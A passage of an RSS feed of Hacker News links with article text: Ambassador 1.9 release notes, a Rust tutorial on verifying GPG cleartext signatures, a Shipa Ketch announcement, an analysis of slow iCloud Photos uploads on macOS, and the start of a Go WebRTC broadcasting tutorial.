   <br>      documented: "true"</span></pre><p id="cfca">For more details, see the <a href="https://www.getambassador.io/docs/latest/topics/using/dev-portal/" rel="noopener">updated Developer Portal documentation</a>.</p><p id="d7ed">Ambassador is deployed in thousands of mission critical environments. When something isn’t working as it should, it’s critical to quickly rectify the issue. With 1.9, we’re introducing a live debugging endpoint that is exposed inside the cluster that provides live status information. Information included in the endpoint includes timer information (e.g., how long it took to compute a new Envoy configuration) as well as real-time information about resource usage (e.g., memory usage).</p><pre><span id="336f">/ambassador $ curl localhost:8877/debug<br>{<br>  "timers": {<br>    "check_alive": "2824, 465.838µs/62.327255ms/123.436247ms",<br>    "check_ready": "2824, 544.802µs/60.071622ms/188.105761ms",<br>    "consulUpdate": "0, 0s/0s/0s",<br>    "katesUpdate": "17663, 33.543µs/74.046µs/276.191659ms",<br>    "notifyWebhook:diagd": "3, 3.544200509s/3.780843008s/4.185688573s",<br>    "notifyWebhook:edgestack sidecar": "3, 31.212198ms/44.493156ms/56.494476ms",<br>    "notifyWebhooks": "3, 3.590031304s/3.825434799s/4.217081081s",<br>    "parseAnnotations": "3, 47.932µs/802.617µs/2.021262ms",<br>    "reconcileConsul": "3, 119.776µs/196.311µs/247.394µs",<br>    "reconcileSecrets": "3, 56.494µs/147.863µs/194.434µs"<br>  },<br>  "values": {<br>    "envoyReconfigs": {<br>      "times": [<br>        "2020-11-10T18:02:55.230807114Z",<br>        "2020-11-10T18:03:02.573500647Z",<br>        "2020-11-10T18:03:06.960565035Z",<br>        "2020-11-10T18:03:10.403266958Z"<br>      ],<br>      "staleCount": 3,<br>      "staleMax": 0,<br>      "synced": true<br>    },<br>    "memory": "0.58Gi of 1.95Gi (29%)"<br>  }<br>}<br>/ambassador $</span></pre><p id="c3a9">API Gateway + Edge Stack:</p><ul><li id="1e46">With <code>AMBASSADOR_FAST_RECONFIGURE</code> make sure health checks can’t get starved during a long reconfigure</li><li id="8788">With <code>AMBASSADOR_FAST_RECONFIGURE</code>, rate limit based on actual memory usage to avoid the pod getting killed for consuming too much memory</li><li id="395f">Alpine upgraded to 3.12 from 3.10</li><li id="a0be">GNU libc upgraded from 2.30 to 2.32</li><li id="d2e3">Python upgraded from 3.7 to 3.8, with dependencies updated to fix CVE-2020–25659</li><li id="f6a9">Knative serving tests updated from 0.11.0 to 0.18.0 (thanks, Noah Fontes!)</li><li id="f8e6"><code>ConsulResolver</code> will now fallback to the <code>Address</code> of a Consul service if <code>Service.Address</code> is not set</li><li id="23b1">The <code>RateLimitService</code> and <code>AuthService</code> configs now support switching between gRPC protcol versions <code>v2</code> and <code>v2alpha</code></li><li id="ebb3">The <code>TracingService</code> Zipkin configuration now supports setting <code>collector_hostname</code> to tell Envoy which host header to set when sending spans to the collector; this is required for New Relic APM support</li><li id="356f">Mixed <code>Mapping</code>s with and without <code>host_redirect</code> will not crash</li><li id="5380">Support for enabling metrics on gRPC requests, rather than only HTTP requests (thanks, Felipe Roveran!)</li><li id="9759">Documentation on how to build Ambassador completely inside Docker (thanks Rahul Saini!)</li><li id="6f1c">Fixed spurious error message when using <code>prefix_rewrite</code> (thanks, <a href="https://github.com/obataku" rel="noopener">Obataku</a>!)</li><li id="cf71">Guard <code>/metrics</code> against uninitialized IR (thanks, Markus Jevring!)</li></ul><p id="d994">Edge Stack only:</p><ul><li id="1562">How the<code>OAuth2</code> filter authenticates itself to the identity provider is now configurable with the <code>clientAuthentication</code> setting</li><li id="75e3">The <code>OAuth2</code> Filter can now use RFC 7523 JWT assertions to authenticate itself to the identity provider; this is usable with all grant types.</li><li id="9fbe">When validating a JWT’s scope, the <code>JWT</code> and <code>OAuth2</code> Filters now support not just RFC 8693 behavior, but also the behavior of various drafts leading to it, making JWT scope validation usable with more identity providers.</li><li id="3d4c">The <code>OAuth2</code> Filter now has <code>inheritScopeArgument</code> and <code>stripInheritedScope</code> settings that can further customize the behavior of <code>accessTokenJWTFilter</code>.</li><li id="f47f">The <code>OAuth2</code> Filter argument <code>scopes</code> has been renamed to <code>scope</code>, for consistency. The name <code>scopes</code> is deprecated, but will continue to work for backward compatibility.</li><li id="3218"><code>OAuth2</code> Filter: Don't have <code>accessTokenValidation: auto</code> fall back to "userinfo" validation for a client_credentials grant; it doesn't make sense there and only serves to obscure a more useful error message.</li></ul><p id="b543">The Ambassador Edge Stack is a complete superset of the open-source Ambassador API Gateway, with integrated support for rate limiting, authentication, filter management, and more. You can install the Ambassador Edge Stack in a few steps with the <a href="https://www.getambassador.io/docs/latest/tutorials/getting-started/" rel="noopener">quick start</a>.</p><h2 id="b59d">Fast, customized configuration</h2><p id="d57d">The <a href="https://app.getambassador.io/initializer/" rel="noopener">K8s Initializer</a> will generate customized YAML configuration for your Edge Stack installation, based on your specific requirements. Confused about the right configuration for TLS termination, observability, authentication, or continuous delivery? Use the <a href="https://app.getambassador.io/initializer/" rel="noopener">Initializer</a> to generate your configuration for you.</p><p id="56b2">The latest versions of Ambassador are now available here:</p><ul><li id="6954">Ambassador API Gateway: <a href="https://hub.docker.com/r/datawire/ambassador" rel="noopener">https://hub.docker.com/r/datawire/ambassador</a></li><li id="72cf">Ambassador Edge Stack: <a href="https://hub.docker.com/r/datawire/aes" rel="noopener">https://hub.docker.com/r/datawire/aes</a></li></ul><p id="1f8c">You can also install it with Helm.</p><pre><span id="9df9"># Add repository and create namespace<br>helm repo add datawire<a href="https://www.getambassador.io/" rel="noopener"> https://www.getambassador.io</a></span><span id="6674"># Helm 3<br>kubectl create namespace ambassador &amp;&amp; helm install ambassador — namespace ambassador datawire/ambassador</span><span id="1238"># Helm 2<br>kubectl create namespace ambassador &amp;&amp; helm install — name ambassador — namespace ambassador datawire/ambassador</span></pre><p id="de9c">To install the Ambassador Edge Stack, follow the <a href="https://www.getambassador.io/docs/latest/tutorials/getting-started/" rel="noopener">quick start</a>.</p><p id="86a6">We’re hosting a four day online meetup concurrent with KubeCon NA, with lightning talks by many of our Ambassador engineers. If you’re interested, <a href="https://www.getambassador.io/ambassador-fest/" rel="noopener">check out the schedule</a> and drop by! We’re also be giving out T-shirts, too!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.getambassador.io/custom-error-responses-oauth2-improvements-live-debugging-flexible-dev-portal-3c98e9e978bb</link>
            <guid isPermaLink="false">hacker-news-small-sites-25074560</guid>
            <pubDate>Thu, 12 Nov 2020 20:32:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build your own GPG in Rust]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073982">thread link</a>) | @fanf2
<br/>
November 12, 2020 | https://andrewhalle.github.io/build-your-own/gpg | <a href="https://web.archive.org/web/*/https://andrewhalle.github.io/build-your-own/gpg">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="write"><p><span>By: </span><a href="https://github.com/andrewhalle"><span>Andrew Halle</span></a>
<span>Repo: </span><a href="https://github.com/andrewhalle/byo-gpg"><span>byo-gpg</span></a>
<span>Date: 2020-11-07</span></p><p><span>Part of </span><a href="https://andrewhalle.github.io/build-your-own"><span>build-your-own</span></a></p><h2><a name="background"></a><span>Background</span></h2><p><span>GPG (stands for Gnu Privacy Guard) is an implementation of PGP (which stands for Pretty Good Privacy), an open standard for encryption specified by </span><a href="https://tools.ietf.org/html/rfc4880"><span>RFC 4880</span></a><span>. In this post, we'll build up a program in Rust that implements one part of the PGP standard, verifying cleartext signatures.</span></p><p><em><span>(note: I think it's hilarious that GPG is an implementation of PGP. The obvious right choice was to call it GPGP. I considered calling my tool PGPG, but ultimately decided on pgp-rs, because I'm boring.)</span></em></p><p><span>PGP supports a number of different cryptography suites, but the default cipher suite, and the one I'm most familiar with, is RSA cryptography. A quick review of </span><a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)"><span>RSA</span></a><span> might be warranted (it certainly was for me).</span></p><h3><a name="rsa"></a><span>RSA</span></h3><p><span>RSA is a public-key cryptosystem (one in which parts of the key used for encryption are allowed to be non-secret) which relies on the impracticality of factoring very large (a normal figure is 2048 bits) composite numbers. Put another way, it is easy to find 3 large integers n, d, and e with the property that</span></p><p><span>but it's very difficult, given only m, e and n, to discover d. In this way, the tuple (e,n) forms the public key, which can be broadcast to the world, and the tuple (e,d,n) forms the private key, which is kept secret. Messages can be encrypted by computing the ciphertext C</span></p><p><span>C can then be decrypted by anyone with the corresponding private key by computing</span></p><p><span>So C forms a secret message that's only readable by the intended recipient. Similarly, the owner of the private key can compute a signature S</span></p><p><span>which can be verified by anyone with the public key by computing</span></p><p><span>In this way, the owner of the private key can create something that can be verified to be authentic.</span></p><h3><a name="gpg-operation"></a><span>GPG operation</span></h3><p><span>GPG provides operations for generating and distributing keys, encrypting messages, and producing signatures. The particular operation we're interested in right now is producing a </span><em><span>cleartext signature</span></em><span>, one that includes the message for anyone to read, and an associated signature that confirms the message is from the owner of the private key.</span></p><p><span>In order to produce a cleartext signature, you must first generate a public/private key pair.</span></p><pre spellcheck="false" lang=""></pre><p><span>GPG will ask for some identifying information, generate a new key (RSA by default), and store it in the keyring. The key can be exported to a file (important for us to ingest it!) via</span></p><pre spellcheck="false" lang=""></pre><p><span>We'll get into the format of this key later.</span></p><p><span>With a key in hand, we can generate a cleartext signature via</span></p><pre spellcheck="false" lang=""></pre><p><em><span>(note: use </span><a href="https://github.com/sharkdp/bat"><span>bat</span></a><span>! it's great)</span></em></p><p><span>This is the full signature of the text "hello world" using the keypair I generated for this blog post. We'll also get into the format of this signature later. You now as familiar with GPG as you need to be to go through the rest of this post. So, let's start writing some code!</span></p><h2><a name="getting-started"></a><span>Getting started</span></h2><h3><a name="dependencies"></a><span>Dependencies</span></h3><p><span>We start in the normal way</span></p><pre spellcheck="false" lang=""></pre><p><span>I'll go ahead and add all the dependencies we'll need upfront, just to get it out of the way.</span></p><pre spellcheck="false" lang="toml"></pre><p><span>we'll use</span></p><ul><li><a href="https://crates.io/crates/clap"><span>clap</span></a><span> for easily building a CLI </span><em><span>(admittedly this is overkill for a program that does one thing, I originally intended to build out more PGP functionality, before deciding that cleartext signatures alone exercise all the interesting characteristics I wanted to)</span></em></li><li><a href="https://crates.io/crates/num"><span>num</span></a><span> for working with big numbers, and doing modular exponentiation</span></li><li><a href="https://crates.io/crates/nom"><span>nom</span></a><span> for parsing our files, nom is a parser combinator library (I'll explain that a bit more later)</span></li><li><a href="https://crates.io/crates/base64"><span>base64</span></a><span> for decoding base64 data</span></li><li><a href="https://crates.io/crates/byteorder"><span>byteorder</span></a><span> for decoding numbers of a particular endianness</span></li><li><a href="https://crates.io/crates/anyhow"><span>anyhow</span></a><span> for easy error handling</span></li><li><a href="https://crates.io/crates/sha2"><span>sha2</span></a><span> for computing hash functions (more on this later)</span></li><li><a href="https://crates.io/crates/regex"><span>regex</span></a><span> for replacing newlines </span><em><span>(squints at everyone using windows)</span></em></li><li><a href="https://crates.io/crates/assert_cmd"><span>assert_cmd</span></a><span> for easy integration testing</span></li></ul><p><em><span>(note: phew)</span></em></p><h3><a name="cli"></a><span>CLI</span></h3><p><span>Okay, with that out of the way, we can </span><em><span>really</span></em><span> start writing some code!</span></p><p><span>In </span><code>main.rs</code><span> we put our clap description of our CLI</span></p><pre spellcheck="false" lang="rust"></pre><p><span>I personally really like the macro method of specifying the CLI, but there are other methods. This defines an app (and its metadata) as well as a subcommand </span><code>verify</code><span> that takes two command line arguments, </span><code>source</code><span> which will be the cleartext signature we're verifying, and </span><code>publicKey</code><span> which will be the public key we use to verify it. After parsing the command-line arguments, and providing some sensible defaults, we call out to </span><code>pgp_rs::verify_cleartext_message</code><span> which we define in </span><code>lib.rs</code><span> (I'll stop including filenames from here on out, find the code in the </span><a href="https://github.com/andrewhalle/byo-gpg"><span>repo</span></a><span>!)</span></p><pre spellcheck="false" lang="rust"></pre><p><em><span>(note: this snippet of code uses types </span><code>CleartextSignature</code><span> and </span><code>PublicKey</code><span> which we haven't defined yet. I'm just sketching out the broad structure of this method to get the boring stuff out of the way first.)</span></em></p><p><span>We parse the cleartext signature and the key, and then verify the signature with the key. If the signature fails to verify with the key, we return an error so the program exits with an error code (I'll ignore the modules set up in this snippet for the rest of the write-up).</span></p><p><span>Now, we can get into the meat of this code, the parsing functions. In order to do </span><em><span>that</span></em><span> however, we have to take a brief detour </span><em><span>INTO THE RFC</span></em><span>. Take this </span><code>::&lt;&gt;</code><span>, it's dangerous to go alone.</span></p><h2><a name="implementation"></a><span>Implementation</span></h2><p><span>The RFC containing the details of PGP is </span><a href="https://tools.ietf.org/html/rfc4880"><span>RFC 4880</span></a><span>. The main sections of the RFC we'll need to deal with in this blog post are sections </span><a href="https://tools.ietf.org/html/rfc4880#section-3.2"><span>3.2</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-4"><span>4</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-5.2.3"><span>5.2.3</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-5.2.4"><span>5.2.4</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-5.5.1.1"><span>5.5.1.1</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-6.1"><span>6.1</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-6.2"><span>6.2</span></a><span>, and </span><a href="https://tools.ietf.org/html/rfc4880#section-7"><span>7</span></a><span>.</span></p><h3><a name="cleartext-signatures"></a><span>Cleartext signatures</span></h3><p><span>The functionality of PGP that we're implementing is validating </span><em><span>cleartext signatures</span></em><span> (described in </span><a href="https://tools.ietf.org/html/rfc4880#section-7"><span>section 7</span></a><span> of the RFC). A cleartext signature is a signature that embeds the text being signed in a readable way into the signature itself. It has several parts:</span></p><ul><li><span>a header of </span><code>-----BEGIN PGP SIGNED MESSAGE-----</code></li><li><span>one or more </span><code>Hash</code><span> armor headers</span></li><li><span>one empty line</span></li><li><span>the dash-escaped cleartext</span></li><li><span>the ASCII-armored signature</span></li></ul><p><span>We'll talk about parsing ASCII armor in the next section, but we have enough information to parse most of this already. In order to recognize a cleartext signature, we need to first look for the header, followed by a </span><code>Hash: &lt;alg&gt;</code><span> (</span><code>alg</code><span> in this case will be SHA256, but there are other options), an empty line, the cleartext, then finally the signature.</span></p><p><span>The cleartext will be in form called "dash-escaped", which is described in the RFC. Dash-escaped text is the same as normal text, but if the line starts with a literal </span><code>-</code><span>, then it is prefixed by a dash, followed by a space. We'll know when we're done with parsing the cleartext because the ASCII armor always starts with a line beginning with 5 dashes, which we will recognize as not being dash-escaped.</span></p><p><span>I'll be using </span><a href="https://crates.io/crates/nom"><span>nom</span></a><span> to build all the different parsers we'll need. Nom is a </span><em><span>parser combinator</span></em><span> library. Parser combinators are a technique for writing parsers where simple parsers (say, for recognizing a literal word, or a string of characters which are all </span><code>a</code><span>) are combined to form more complex parsers. All nom parsers have the signature</span></p><pre spellcheck="false" lang="rust"></pre><p><span>where </span><code>T</code><span> is the raw type we're parsing from (usually </span><code>&amp;str</code><span> or </span><code>&amp;[u8]</code><span>) and </span><code>U</code><span> is the type we're parsing. The parser either succeeds or fails, and if it succeeds, it returns a tuple of </span><code>(T, U)</code><span> where the first entry of the tuple is the remaining input, and the second entry of the tuple is what was parsed. For example, a simple parser that parses a </span><code>Color</code><span> enum from a string could look like</span></p><pre spellcheck="false" lang="rust"></pre><p><span>This example defines 3 parsers, </span><code>parse_red</code><span>, </span><code>parse_green</code><span>, and </span><code>parse_blue</code><span>, which look for a literal string, and if it's found, return the associated </span><code>Color</code><span> variant. If the input does not contain the string literal, the parser fails (that's why we can ignore the result of the tag parser, we know what it was, and we can return the built value we wanted). </span><code>parse_color</code><span> is then built from these basic blocks using the </span><code>alt</code><span> combinator, which succeeds if one of the parsers passed to it in a tuple succeeds, and it succeeds with that result. The </span><code>main</code><span> function then parses a single color from the string </span><code>"Green123"</code><span>, leaving the </span><code>123</code><span> string remaining.</span></p><p><span>Now to parse a cleartext signature using nom, we first define a </span><code>struct</code><span> to parse into</span></p><pre spellcheck="false" lang="rust"></pre><p><span>The </span><code>hash</code><span> field will hold the hash variant we're using (could have been an enum if we were being rigorous, or supporting more than just SHA256), the cleartext (after we remove the dash-escaping), and then the signature (which we'll get to later).</span></p><p><span>The parser for our cleartext signature will look like the following</span></p><pre spellcheck="false" lang="rust"></pre><p><span>This parser first recognizes the header, then the hash variant, then the cleartext, then the parts of the ASCII armor. It also enforces that there's no more input to consume using the </span><code>all_consuming</code><span> parser. Assuming all that is successful, we return the pieces we need to assemble the cleartext signature.</span></p><p><span>Drilling down into the methods we decreed must exist</span></p><pre spellcheck="false" lang="rust"></pre><p><code>alphanumeric1</code><span> is a parser included with nom that recognizes at least one alphanumeric character. </span><code>preceded</code><span> is a parser that takes two parsers as argument, it returns as a success the result of the second parser, if both succeed. </span><code>terminated</code><span> is a parser that takes two parsers as argument, and returns as success the result of the first parser, if both are successful. So, the </span><code>parse_hash_armor_header</code><span> function recognizes an </span><code>alphanumeric1</code><span> string preceded by </span><code>Hash:</code><span> and returns it, ignoring any trailing newlines.</span></p><pre spellcheck="false" lang="rust"></pre><p><code>parse_possibly_dash_escaped_chunk</code><span> uses a helper I wrote </span><code>fold_into_string</code><span> which takes a parser that parses a single line of text and runs it repeatedly (until it fails), collecting the results into a </span><code>String</code><span>. We then </span><code>pop()</code><span> the last character off the string, because we don't need the last newline.</span></p><pre spellcheck="false" lang="rust"></pre><p><code>parse_possibly_dash_escaped_line</code><span> uses the </span><code>alt</code><span> combinator we've already seen to either parse a line beginning with no dash, or a line beginning with a dash-space. </span><code>parse_line_newline_inclusive</code><span> is a helper to grab a string slice including the last newline. Because nom parsers can recognize up to the newline, but not go past it in the same breath, I needed an unsafe function to consume the newline, and then modify the resulting string slice to be 1 byte longer, which is safe because I know the next byte was a newline (or the parser would have failed).</span></p><pre spellcheck="false" lang="rust"></pre><p><span>Now, we can go back up and see the </span><code>Cleartext::parse</code><span> function</span></p><pre spellcheck="false" lang="rust"></pre><p><span>Not every line of this is clear yet. We haven't talked about ASCII armor or PGP packets at all yet. Nonetheless, …</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://andrewhalle.github.io/build-your-own/gpg">https://andrewhalle.github.io/build-your-own/gpg</a></em></p>]]>
            </description>
            <link>https://andrewhalle.github.io/build-your-own/gpg</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073982</guid>
            <pubDate>Thu, 12 Nov 2020 19:43:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Shipa Open Sources Ketch]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25073458">thread link</a>) | @129jdsf
<br/>
November 12, 2020 | https://www.tfir.io/shipa-open-sources-ketch/ | <a href="https://web.archive.org/web/*/https://www.tfir.io/shipa-open-sources-ketch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                                                                
                                                                        <p><a href="https://www.shipa.io/">Shipa</a> is open sourcing <a href="http://theketch.io/">Ketch</a>, Shipa’s deployment engine, under Apache License Version 2.0. This open source release follows the <a href="https://www.globenewswire.com/news-release/2020/10/08/2105531/0/en/Shipa-Launches-with-Unique-Solution-for-Developing-Deploying-and-Managing-Cloud-Native-Applications-No-Kubernetes-Expertise-Necessary.html">general availability launch</a> of Shipa’s full application management framework in October.</p>
<p>Using Ketch, application developers can manage the entire deployment process at the application level. Developers can stay focused on writing code and do not need any Kubernetes expertise to deploy applications running on Kubernetes.</p>
<p>As a result, teams can accelerate the time needed to adopt Kubernetes, while simultaneously increasing their pipeline’s resilience and reducing the compounding risk with each new deployment.</p>
<p>Ketch reduces the number of Kubernetes objects that developers must learn and maintain in order to leverage Kubernetes best practices for managing applications. The deployment engine does this by generating all Kubernetes-related objects that are required to run applications on Kubernetes – automatically and directly from their application code.</p>
<p>Ketch also enables developers to generate Helm charts directly from the application code, allowing them to fully customize ingress, services, security, resources and more before deployment. Developers can also use their existing container images, in which case Ketch creates and deploys all necessary objects for the application to run.</p>
<p>Ketch offers connections into existing clusters (beginning with Kubernetes 1.14+) and improves the developer experience and application delivery speed by fitting into developers’ existing stack.</p>
<p>Shipa is a Silver member of the Cloud Native Computing Foundation and a General member within the Continuous Delivery Foundation.</p>
<p>Shipa is funded by Engineering Capital and Jump Capital; advisors include Google’s Kelsey Hightower, Mastercard’s Ken Owens, and Lyft’s Matt Klein.</p>

<!-- AI CONTENT END 1 -->
    							</div></div>]]>
            </description>
            <link>https://www.tfir.io/shipa-open-sources-ketch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073458</guid>
            <pubDate>Thu, 12 Nov 2020 18:59:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why iCloud Photos is slow to upload on macOS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25072695">thread link</a>) | @shivpatelssp
<br/>
November 12, 2020 | https://shivpatel.io/software/2020/11/12/how-icloud-photos-architecture-causes-slow-uploads.html | <a href="https://web.archive.org/web/*/https://shivpatel.io/software/2020/11/12/how-icloud-photos-architecture-causes-slow-uploads.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>The word <em>uploads</em> is in quotes for a reason. Let’s find out why…</p>


<ul>
  <li>2019 16” MacBook Pro
    <ul>
      <li>2.6 GHz 6-Core Intel Core i7</li>
      <li>macOS Catalina 10.15.7</li>
      <li>Photos 5.0 (161.0.120)</li>
    </ul>
  </li>
  <li>Roughly 1,800 media files (JPG, HEIC, PNG, MOV, MP4) totaling 50GB</li>
  <li>Full gigabit connection (1,000 Mbps up, 1,000 Mbps down)</li>
  <li>Google Photos as a benchmark for comparison</li>
</ul>



<p>First, I tried Google Photos. Drag-and-drop into the Chrome tab. Roughly 20 minutes later all 50GB worth of media is done uploading.</p>

<p>I’m able to view most my media instantly online. Google takes 3 hours to further process 160 videos in my upload; likely to convert them into a more compatible format (<em>foreshadowing</em>).</p>

<p>This experience seems reasonable, so let’s use it as our baseline.</p>



<p>I upgrade my account to the 200GB tier and enable iCloud Photo syncing on my Mac. Drag and drop the media files into the native Photos app and off we go!</p>

<p>One hour later… only 31 items uploaded. 😯</p>

<p>Eight hours later… only 97 items uploaded. 🤔</p>

<p>My ISP can’t be the issue. Google Photos had worked fine. I’m able to browser the web just fine. My Mac doesn’t seem to be doing anything intensive either; no excessive heat or fan noise.</p>

<p>A few DuckDuckGo searches later, it’s becoming very apparent others are experiencing the same issue. Most people blame Apple’s servers for being slow or rant about how bad their ISP is. Something doesn’t seem right.</p>



<p>I start my debugging process in Activity Monitor. Things become obvious very quick:</p>

<p><img src="https://shivpatel.io/assets/icloud-photos-activity-monitor.png" alt="iCloud Photos Upload Processes"></p>

<p>Let’s breakdown the two processes:</p>

<p><code>VTEncoderXPCService</code> is a sandboxed host used by QuickTime for video and audio decoding. The VT stands for <code>VideoTooolbox</code>. It’s used to process content when an app calls the built-in macOS audio and video API. It could be triggered by the Photos app, but it could also be a video playing in a web browser like Firefox.</p>

<p><code>com.apple.photos.VideoConversionService</code> doesnt need an explanation. The name gives it all away.</p>

<p>Considering the latter process name and the fact that I didn’t have any other apps open at the time, it’s pretty obvious Photos is doing some sort of video conversion. But why?</p>

<p>After some more research, I came across the following statement on Apple’s website:</p>

<blockquote>
  <p>File types that you can use with iCloud Photos</p>
</blockquote>

<blockquote>
  <p>Your photos and videos are stored in iCloud exactly as you took them. All of your images are held in their original formats at full resolution — HEIF, JPEG, RAW, PNG, GIF, TIFF, HEVC, and MP4 — as well as special formats you capture with your iPhone, like slo-mo, time-lapse, 4K videos, and Live Photos.</p>
</blockquote>

<p>Source: <a href="https://support.apple.com/en-us/HT204264">https://support.apple.com/en-us/HT204264</a></p>

<p>Ah ha! If you recall earlier, I mentioned my test media included MOV files. These are old family videos converted and exported via QuickTime Player. MOV is not a supported format according to the above statement.</p>

<p>Additionally, when I track the upload count in the Photos app, I can infer that media is being uploaded by date; newest to oldest. The count consistently lags at the index of an MOV file.</p>

<p><img src="https://shivpatel.io/assets/icloud-photos-progress-bar.png" alt="Photos Progress Bar"></p>



<p>Photos is likely converting incompatible media files into an iCloud desired format before uploading them.</p>

<p>More importantly, <strong>it seems Apple has made the architectural decision to convert incompatible iCloud media on the end user’s device, instead of processing it in the cloud</strong> like Google Photos.</p>



<p>Converting before uploading isn’t a big deal. Heck, I give Apple credit for choosing a decentralized and cost efficient architecture.</p>

<p><strong>The real issue is an overly simplified user experience that’s missing transparency.</strong> It took an  engineer an hour to figure out what was happening. I can only imagine how millions of non-technical Apple users would feel. Search Google and you’ll see the widespread frustration and confusion with iCloud Photos and “slow uploads.”</p>



<p>We all know when our Mac has entered beast mode to tackle CPU intensive tasks; fans blazing and toasty to the touch. Try converting video files in <a href="http://handbrake.fr/">HandBrake</a> and you’ll see exactly what I’m saying.</p>

<p><strong>The Photos app however, avoids beast mode and slows the rate of video conversion in the background.</strong> It makes sense that Apple does not want to impair your foreground experience or raise concerns by running your Mac at full speed. <strong>But it also makes it really hard to see what’s happening and significantly increases the time required to complete conversions.</strong></p>



<p>Here are a few recommendations (for Apple) that could improve the perception and experience with iCloud Photos on macOS:</p>

<ul>
  <li>Call out incompatible media. <strong>Make it known when media needs to be converted.</strong> Or require incompatible media to be converted upon import into the Photos app.</li>
  <li>A progress bar stuck at 90% is more satisfying than one at 50%. <strong>Prioritize the upload of compatible media first.</strong> If your incompatible media is more recent, you’ll be stuck waiting for it convert before anything else gets uploaded.</li>
  <li><strong>Provide more insight</strong> as to when uploading vs conversion is happening behind-the-scenes.</li>
  <li><strong>Run full speed conversions when the Photos app is in the foreground.</strong></li>
</ul>



<p>My Mac has been plugged in 24/7 for the past 4 days and I still have 177 items left to “upload.”</p>



<p>iCloud Photos on macOS converts incompatible media locally before uploading to iCloud. It disguises the conversion process as part of the “upload” phase for iCloud Photos.</p>

<p><em>This issue is only with incompatible media imported to iCloud Photos via the Mac Photos app. It’s very unlikely your iPhone or iPad would be taking pictures and videos in an incompatible format.</em></p>

  </div></div>]]>
            </description>
            <link>https://shivpatel.io/software/2020/11/12/how-icloud-photos-architecture-causes-slow-uploads.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25072695</guid>
            <pubDate>Thu, 12 Nov 2020 18:07:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a WebRTC Broadcaster in Golang using ion-sfu and media devices]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25072605">thread link</a>) | @taylored
<br/>
November 12, 2020 | https://gabrieltanner.org/blog/broadcasting-ion-sfu | <a href="https://web.archive.org/web/*/https://gabrieltanner.org/blog/broadcasting-ion-sfu">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section> <section><div uk-grid=""><div><section>  <!----> <section><!--kg-card-begin: markdown--><p>WebRTC, short for Web Real-Time Communication, is a communication protocol that enables real-time audio, video and data transmission on the web by utilizing peer to peer connections.</p>
<p>WebRTC also provides a Javascript API that is available by default in most browsers and helps developers implement the protocol in their applications. But there are also some implementations of the WebRTC protocol in other languages.</p>
<p>In this tutorial, you will build a video broadcasting application that reads the camera in Golang and sends it to the ION-SFU (Selective forwarding unit) which allows WebRTC sessions to scale more efficiently.</p>
<p>The application will also feature a small frontend that lets you watch the video you published by reading it from the ION-SFU server.</p>
<h2 id="prerequisites">Prerequisites</h2>
<p>Before you begin this guide, you’ll need the following:</p>
<ul>
<li>A valid Golang installation.</li>
<li>Camera connected to your computer that can be read using Video for Linux as a source for the video stream.</li>
<li>(Optional) If you want to connect with devices that are not on your network you will need to add a TURN server to your application. If you want to know more about TURN and how to set up your own check out <a href="https://gabrieltanner.org/blog/turn-server">this article</a>.</li>
</ul>
<h2 id="technologystack">Technology Stack</h2>
<p>Now that you have an overview of what you are going to build let's take a closer look at the tools in use and how they work with each other.</p>
<!-- TODO: Add illustration -->
<p>Let's break the different components down:</p>
<ul>
<li><a href="https://github.com/pion/webrtc">Pion</a> - Pure Golang implementation of the WebRTC protocol. Used to establish a peer connection to ION-SFU and send the video stream.</li>
<li><a href="https://github.com/pion/ion-sfu">ION SFU</a> - ION SFU (Selective Forwarding Unit) is a video routing service that allows Webrtc sessions to scale more efficiently.</li>
<li><a href="https://github.com/pion/mediadevices">Pion mediadevices</a> - Golang implementation of the <a href="https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices">Mediadevices API</a> which is used to read the camera as a Mediastream that can be sent using the peer connection.</li>
</ul>
<p>One main benefit of this is that you can read the camera without the need to open a browser tab. Using a selective forwarding unit will also help a lot with performance and scaling the application for a large size of users.</p>
<p>This article assumes a basic knowledge of WebRTC. If you do not have any previous experience, I recommend reading the free book <a href="https://webrtcforthecurious.com/docs/01-what-why-and-how/">WebRTC for the curious</a>.</p>
<h2 id="settingupionsfu">Setting up ION-SFU</h2>
<p>In this section, you will clone and configure the ION-SFU server so that you can use it with your application.</p>
<p>First, you will clone the repository so you have all the resources needed to start setting up your selective forwarding unit:</p>
<pre><code>git clone https://github.com/pion/ion-sfu.git
</code></pre>
<p>This command will clone the ION-SFU repository from Github and create a folder with the name of <strong>ion-sfu</strong> in your directory. Now enter the directory using the following command:</p>
<pre><code>cd ion-sfu
</code></pre>
<p>Next you can edit the configuration of the sfu by changing the <strong>config.toml</strong> file. The standard configurations are fine for testing and local use but I would recommend adding a STUN and TURN server if you try to access the server from a device in another network.</p>
<p>If you are not sure how to create a TURN server I would recommend reading <a href="https://gabrieltanner.org/blog/turn-server">this guide</a>.</p>
